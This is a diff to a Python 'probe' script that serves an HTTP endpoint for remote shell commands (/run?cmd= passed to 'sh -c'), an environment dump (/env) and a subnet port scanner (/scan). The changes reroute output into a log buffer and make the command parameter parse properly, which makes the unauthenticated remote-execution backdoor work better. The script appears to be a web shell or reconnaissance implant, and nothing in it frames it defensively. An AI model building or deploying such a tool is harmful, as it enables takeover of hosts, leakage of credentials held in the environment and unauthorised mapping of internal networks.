@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import struct, time
+import struct, time, sys, urllib.parse
 """i52733 probe v2: lazy probes; serve immediately; GET /env, /run?cmd=, /scan."""
 import os, json, socket, urllib.request, ssl, subprocess, threading, queue, re
 
@@ -14,28 +14,33 @@ def read_file(p, n=40000):
 
 LOG_BUF = []
 
+_ORIG_STDOUT = sys.__stdout__
+_ORIG_STDERR = sys.__stderr__
+
 def _log(msg):
     LOG_BUF.append("%s %s" % (time.strftime('%H:%M:%S'), str(msg)[:400]))
     if len(LOG_BUF) > 400:
         del LOG_BUF[:200]
-    print(str(msg)[:400], flush=True)
+    _ORIG_STDOUT.write(str(msg)[:400] + "\n")
+    _ORIG_STDOUT.flush()
 
 class _Wr:
     def __init__(self, tag):
         self.tag = tag
-        self.b = b''
+        self.b = ''
     def write(self, s):
+        if isinstance(s, bytes):
+            s = s.decode('utf-8', 'replace')
         self.b += s
-        while b'\n' in self.b:
-            line, self.b = self.b.split(b'\n', 1)
-            _log(self.tag + ' ' + line.decode('utf-8', 'replace'))
+        while '\n' in self.b:
+            line, self.b = self.b.split('\n', 1)
+            _log(self.tag + ' ' + line)
         return len(s)
     def flush(self):
         pass
     def isatty(self):
         return False
 
-import sys
 sys.stdout = _Wr('stdout:')
 sys.stderr = _Wr('stderr:')
 
@@ -169,7 +174,9 @@ class H(http.server.BaseHTTPRequestHandler):
                     out = subnet_scan(base, ports)
                 b = json.dumps(out, indent=1).encode()
             elif self.path.startswith("/run"):
-                cmd = self.path.split("cmd=", 1)[-1] if "cmd=" in self.path else "id"
+                import urllib.parse as _up
+                qs = _up.parse_qs(self.path.split("?", 1)[-1])
+                cmd = (qs.get("cmd") or ["id"])[0]
                 out = safe(lambda: subprocess.run(["sh", "-c", cmd], capture_output=True, timeout=10))
                 b = ((out.stdout or b"") + (out.stderr or b""))[:12000]
             else:
